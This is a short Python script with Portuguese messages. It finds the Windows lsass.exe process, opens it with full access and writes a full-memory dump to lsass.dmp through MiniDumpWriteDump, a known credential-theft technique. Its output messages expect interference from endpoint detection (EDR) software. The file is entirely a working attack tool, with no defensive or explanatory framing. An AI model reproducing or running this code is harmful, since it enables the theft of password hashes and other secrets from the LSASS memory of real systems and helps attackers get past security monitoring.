import ctypes
import ctypes.wintypes as wintypes
import os

def dump_lsass(nome_arquivo='lsass.dmp'):
    PROCESS_ALL_ACCESS = 0x1F0FFF

    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    dbghelp = ctypes.WinDLL('dbghelp', use_last_error=True)

    OpenProcess = kernel32.OpenProcess
    OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    OpenProcess.restype = wintypes.HANDLE

    MiniDumpWriteDump = dbghelp.MiniDumpWriteDump
    MiniDumpWriteDump.argtypes = [wintypes.HANDLE, wintypes.DWORD,
                                  wintypes.HANDLE, wintypes.DWORD,
                                  wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID]
    MiniDumpWriteDump.restype = wintypes.BOOL

    CreateFile = kernel32.CreateFileW
    CreateFile.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                           wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
    CreateFile.restype = wintypes.HANDLE

    # Encontra o PID do LSASS
    import psutil
    pid_lsass = None
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'lsass.exe':
            pid_lsass = proc.info['pid']
            break

    if pid_lsass is None:
        print("[-] Não foi possível encontrar o LSASS.")
        return

    print(f"[+] LSASS encontrado com PID {pid_lsass}")

    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid_lsass)
    if not process_handle:
        print("[-] Falha ao abrir LSASS. Permissões de SYSTEM necessárias.")
        return

    print("[+] Processo LSASS aberto.")

    GENERIC_WRITE = 0x40000000
    CREATE_ALWAYS = 2
    FILE_ATTRIBUTE_NORMAL = 0x80

    file_handle = CreateFile(nome_arquivo, GENERIC_WRITE, 0, None,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None)

    if file_handle == -1:
        print("[-] Falha ao criar arquivo de dump.")
        return

    MiniDumpWithFullMemory = 0x00000002

    success = MiniDumpWriteDump(process_handle, pid_lsass, file_handle,
                                MiniDumpWithFullMemory, None, None, None)

    if success:
        print(f"[+] Dump salvo como {nome_arquivo}")
    else:
        print("[-] Falha ao criar dump. Talvez o EDR bloqueou.")

